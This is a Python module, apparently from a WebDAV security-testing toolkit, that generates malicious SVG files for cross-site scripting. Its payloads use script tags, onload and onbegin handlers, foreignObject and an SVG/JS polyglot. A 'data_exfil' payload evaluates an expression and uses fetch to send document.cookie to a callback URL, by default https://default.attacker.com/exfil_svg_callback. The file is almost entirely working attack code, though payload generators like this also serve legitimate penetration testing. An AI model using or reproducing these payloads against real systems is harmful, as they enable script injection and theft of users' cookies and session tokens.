import os
import time
import logging
import html # For escaping JS code in attributes if needed
from payload_generator import PayloadGenerator

logger = logging.getLogger(__name__)
# Basic config for logger if no handlers are already configured (e.g. by main app)
if not logger.handlers:
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] %(name)s: %(message)s')


class SVGPayloadGenerator(PayloadGenerator):
    """Generator for SVG-based payloads."""

    def __init__(self, config=None):
        super().__init__(config)
        self.payload_templates = {
            'basic': self._generate_basic_svg,
            'script_tag': self._generate_script_tag_svg,
            'event_handler': self._generate_event_handler_svg,
            'animate': self._generate_animate_svg,
            'foreign_object': self._generate_foreign_object_svg,
            'data_exfil': self._generate_data_exfil_svg,
            'polyglot': self._generate_polyglot_svg
        }

    def get_available_payloads(self):
        """Return list of available SVG payload types."""
        return list(self.payload_templates.keys())

    def generate(self, payload_type, params=None):
        """
        Generate an SVG payload of the specified type.

        Args:
            payload_type (str): The type of SVG payload to generate.
            params (dict, optional): Parameters for the payload, e.g.,
                                     {'js_code': '...', 'callback_url': '...'}.

        Returns:
            str: The filepath of the generated SVG payload.

        Raises:
            ValueError: If the payload_type is unknown.
        """
        params = params or {}

        if payload_type not in self.payload_templates:
            logger.error(f"Unknown SVG payload type requested: {payload_type}")
            raise ValueError(f"Unknown SVG payload type: {payload_type}")

        generator_func = self.payload_templates[payload_type]
        logger.info(f"Generating SVG payload of type '{payload_type}' with params: {params}")

        try:
            svg_content = generator_func(params)
        except Exception as e:
            logger.error(f"Error during generation of SVG type '{payload_type}': {e}", exc_info=True)
            # Depending on desired behavior, you might want to return None or a specific error indicator
            raise

        # Generate filename (sanitize payload_type for filename)
        safe_payload_type = "".join(c if c.isalnum() else "_" for c in payload_type)
        timestamp = int(time.time())
        filename = f"payload_svg_{safe_payload_type}_{timestamp}.svg"

        return self.save_payload(filename, svg_content)

    def _generate_basic_svg(self, params):
        """Generate a basic, benign SVG file for testing."""
        logger.debug("Generating basic SVG.")
        return """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <!-- WebDAV Security Test SVG - Basic -->
    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="red" />
    <text x="50" y="50" font-family="Arial" font-size="12" text-anchor="middle" fill="white">Test</text>
</svg>"""

    def _generate_script_tag_svg(self, params):
        """Generate SVG with embedded script tag."""
        js_code = params.get('js_code', 'alert(document.domain); /* Default script_tag JS */')
        logger.debug(f"Generating script_tag SVG with JS (first 50 chars): {js_code[:50]}...")
        # For content within <script> tags in XML, CDATA sections are often preferred for complex scripts.
        # However, for simple scripts, direct embedding works if special XML chars (&, <, >) are not present
        # or are properly handled by the browser's SVG/XML parser.
        # The most robust way is CDATA or ensuring js_code itself doesn't contain "]]>" or unescaped XML chars.
        # For this example, we'll assume js_code is relatively simple or pre-escaped if necessary.
        # If js_code can contain arbitrary characters, it must be properly escaped or wrapped in CDATA.
        # Example with CDATA: <script type="text/javascript"><![CDATA[\n{js_code}\n]]></script>
        # For now, direct embedding:
        return f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <script type="text/javascript"><![CDATA[
        {js_code}
    ]]></script>
    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="blue" />
    <text x="50" y="50" font-family="Arial" font-size="10" text-anchor="middle" fill="white">Script Tag</text>
</svg>"""

    def _generate_event_handler_svg(self, params):
        """Generate SVG with event handler (e.g., onload)."""
        js_code = params.get('js_code', 'alert(document.domain); /* Default event_handler JS */')
        logger.debug(f"Generating event_handler SVG with JS (first 50 chars): {js_code[:50]}...")
        # JS code in attributes must be HTML/XML attribute-escaped.
        js_code_attr_safe = html.escape(js_code, quote=True)
        return f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="{js_code_attr_safe}">
    <circle cx="50" cy="50" r="40" stroke="black" stroke-width="2" fill="green" />
    <text x="50" y="50" font-family="Arial" font-size="10" text-anchor="middle" fill="white">Event Handler</text>
</svg>"""

    def _generate_animate_svg(self, params):
        """Generate SVG with animation-based execution."""
        js_code = params.get('js_code', 'alert(document.domain); /* Default animate JS */')
        logger.debug(f"Generating animate SVG with JS (first 50 chars): {js_code[:50]}...")
        js_code_attr_safe = html.escape(js_code, quote=True)
        return f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect width="100" height="100" fill="yellow">
        <animate
            attributeName="visibility"
            from="visible"
            to="hidden"
            begin="0s"
            dur="0.1s"
            onbegin="{js_code_attr_safe}" />
    </rect>
    <text x="50" y="50" font-family="Arial" font-size="10" text-anchor="middle" fill="black">Animate Event</text>
</svg>"""

    def _generate_foreign_object_svg(self, params):
        """Generate SVG with <foreignObject> embedding HTML and script."""
        js_code = params.get('js_code', 'alert(document.domain); /* Default foreign_object JS */')
        # Constructing HTML content carefully. The JS code goes into a script tag within this HTML.
        html_body_content = f"""
        <div style="background-color:lightblue; padding:10px;">
            <h1>HTML inside SVG</h1>
            <p>This content is rendered by the HTML parser within foreignObject.</p>
            <script type="text/javascript"><![CDATA[
                {js_code}
            ]]></script>
        </div>
        """
        logger.debug(f"Generating foreign_object SVG with JS (first 50 chars): {js_code[:50]}...")
        return f"""<svg xmlns="http://www.w3.org/2000/svg" width="300" height="150">
    <foreignObject width="100%" height="100%">
        <body xmlns="http://www.w3.org/1999/xhtml">
            {html_body_content}
        </body>
    </foreignObject>
</svg>"""

    def _generate_data_exfil_svg(self, params):
        """Generate SVG that exfiltrates data via fetch API."""
        callback_url = params.get('callback_url', 'https://default.attacker.com/exfil_svg_callback')
        data_to_exfil_script = params.get('data_to_exfil_script', "(typeof document !== 'undefined' ? document.cookie : 'no_document_cookie')")
        logger.debug(f"Generating data_exfil SVG to {callback_url} with data script (first 50 chars): {data_to_exfil_script[:50]}...")

        js_code = f"""
(function() {{
    function exfilData() {{
        try {{
            let dataValue = eval({data_to_exfil_script}); // Eval the provided script string to get data
            let url = `{callback_url}?data_svg=` + encodeURIComponent(String(dataValue));
            fetch(url, {{ method: 'GET', mode: 'no-cors', credentials: 'omit' }});
        }} catch(e) {{
            // Optional: send error? fetch(`{callback_url}?error_svg=` + encodeURIComponent(String(e)));
            // console.error('SVG Exfil Error:', e);
        }}
    }}
    // Attempt exfil immediately and also after a short delay
    if (typeof requestIdleCallback === 'function') {{
        requestIdleCallback(exfilData);
    }} else {{
        setTimeout(exfilData, 100);
    }}
    // Another attempt on load, though script tag might execute before full SVG load event
    // window.addEventListener('load', exfilData);
}})();
        """.strip()

        return f"""<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <script type="text/javascript"><![CDATA[
        {js_code}
    ]]></script>
    <circle cx="50" cy="50" r="40" fill="purple" />
    <text x="50" y="50" font-family="Arial" font-size="10" text-anchor="middle" fill="white">Data Exfil</text>
</svg>"""

    def _generate_polyglot_svg(self, params):
        """Generate a polyglot SVG/JavaScript file."""
        js_code = params.get('js_code', "alert(document.domain); /* Default polyglot JS */")
        logger.debug(f"Generating polyglot SVG/JS with JS (first 50 chars): {js_code[:50]}...")

        js_code_for_onload_attr = html.escape(js_code, quote=True).replace('\n', ' ')

        # This is one common polyglot style.
        # The key is that the start of the file is valid JS comment and valid XML comment/processing instruction.
        return f"""<!--/*--><svg xmlns="http://www.w3.org/2000/svg" onload="{js_code_for_onload_attr}"><script>/*-->
// Polyglot JavaScript Execution Point
(function() {{
    console.log('Polyglot SVG/JS: JS execution context reached.');
    try {{
        {js_code}
    }} catch(err) {{
        // console.error("Error in polyglot JS execution:", err);
    }}
}})();
//</script></svg>"""

    def get_payload_params_definition(self, payload_name: str) -> list[dict]:
        """Return parameter definitions for the given SVG payload type."""
        definitions = []
        if payload_name == 'basic':
            pass # No parameters
        elif payload_name in ['script_tag', 'event_handler', 'animate', 'foreign_object', 'polyglot']:
            definitions.append({
                'name': 'js_code',
                'label': 'JavaScript Code',
                'type': 'string', # Could be 'text' for larger input in UI
                'default': "alert(document.domain + ' - SVG XSS');",
                'description': 'The JavaScript code to embed or execute.',
                'required': True
            })
        elif payload_name == 'data_exfil':
            definitions.extend([
                {
                    'name': 'callback_url',
                    'label': 'Callback URL',
                    'type': 'string',
                    'default': 'https://default.attacker.com/exfil_svg_callback',
                    'description': 'The URL to send the exfiltrated data to.',
                    'required': True
                },
                {
                    'name': 'data_to_exfil_script',
                    'label': 'Data Exfiltration JS (eval)',
                    'type': 'string', # Could be 'text'
                    'default': "(typeof document !== 'undefined' ? document.cookie : 'no_document_cookie')",
                    'description': 'JavaScript expression (string) to evaluate for data to exfiltrate (e.g., document.cookie, localStorage.getItem("token")).',
                    'required': True
                }
            ])
        # else:
            # Optionally raise ValueError for unknown payload_name if strict,
            # but get_available_payloads should be the source of truth for valid names.
            # logger.warning(f"Request for params of unknown SVG payload: {payload_name}")

        return definitions

if __name__ == '__main__':
    # Ensure the logger for __main__ (this script) is also configured to show DEBUG messages for testing
    main_logger = logging.getLogger(__name__)
    if not main_logger.handlers or main_logger.level > logging.DEBUG:
        if not main_logger.handlers: # if no handlers, basicConfig
             logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - [%(levelname)s] %(name)s: %(message)s')
        else: # if handlers exist but level is too high, set level for this logger
            main_logger.setLevel(logging.DEBUG)
        # Also ensure the payload_generator's logger is at debug if we want to see its messages
        logging.getLogger('payload_generator').setLevel(logging.DEBUG)


    main_logger.info("SVGPayloadGenerator demonstration started.")

    test_output_dir_svg = os.path.abspath('./generated_svg_payloads_test_output')
    svg_config = {'output_dir': test_output_dir_svg}

    main_logger.info(f"Test SVG output directory configured to: {test_output_dir_svg}")

    if os.path.exists(test_output_dir_svg):
        main_logger.info(f"Attempting to remove existing SVG test directory: {test_output_dir_svg}")
        import shutil
        try:
            shutil.rmtree(test_output_dir_svg)
            main_logger.info(f"Successfully removed old SVG test directory.")
        except Exception as e:
            main_logger.error(f"Error removing old SVG test directory {test_output_dir_svg}: {e}")

    try:
        svg_gen = SVGPayloadGenerator(config=svg_config)
        main_logger.info(f"SVGPayloadGenerator initialized. Output directory is: {svg_gen.output_dir}")

        available_svg_payloads = svg_gen.get_available_payloads()
        main_logger.info(f"Available SVG payload types: {available_svg_payloads}")

        test_params_simple_alert = {'js_code': "alert('XSS via SVG Test - Simple Alert');"}
        test_params_exfil = {
            'callback_url': 'http://localhost:8000/exfil_listener_svg_callback',
            'data_to_exfil_script': "typeof document !== 'undefined' ? document.location.href : 'no_document_location'"
        }
        test_params_polyglot = {'js_code': "console.log('Polyglot SVG/JS payload executed successfully!'); alert('Polyglot Executed!');"}


        for payload_name in available_svg_payloads:
            main_logger.info(f"\n--- Generating SVG payload: {payload_name} ---")
            current_params = {}
            if "exfil" in payload_name:
                current_params = test_params_exfil
            elif payload_name == 'polyglot':
                current_params = test_params_polyglot
            elif payload_name != 'basic': # For other scriptable types
                 current_params = test_params_simple_alert
            # 'basic' uses no params beyond default

            try:
                file_path = svg_gen.generate(payload_name, params=current_params)
                main_logger.info(f"Generated '{payload_name}' SVG payload at: {file_path}")
                if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
                    main_logger.info(f"File '{file_path}' confirmed to exist and is not empty.")
                    # For debugging, print first few lines of complex payloads
                    if payload_name in ['data_exfil', 'polyglot', 'script_tag', 'foreign_object']:
                         with open(file_path, 'r', encoding='utf-8') as f_content:
                             main_logger.debug(f"Content of {payload_name}:\n{f_content.read(300)}...")
                else:
                    main_logger.error(f"File '{file_path}' NOT FOUND or is EMPTY after generation.")
            except Exception as e:
                main_logger.error(f"Error generating SVG payload '{payload_name}': {e}", exc_info=True)

    except Exception as e:
        main_logger.error(f"Critical error in SVGPayloadGenerator demonstration: {e}", exc_info=True)
    finally:
        if os.path.exists(test_output_dir_svg):
            main_logger.info(f"\nCleaning up SVG test directory: {test_output_dir_svg}")
            try:
                import shutil # ensure imported if not already
                shutil.rmtree(test_output_dir_svg)
                main_logger.info("SVG test directory removed successfully.")
            except Exception as e:
                main_logger.error(f"Error removing SVG test directory {test_output_dir_svg}: {e}", exc_info=True)

    main_logger.info("SVGPayloadGenerator demonstration finished.")
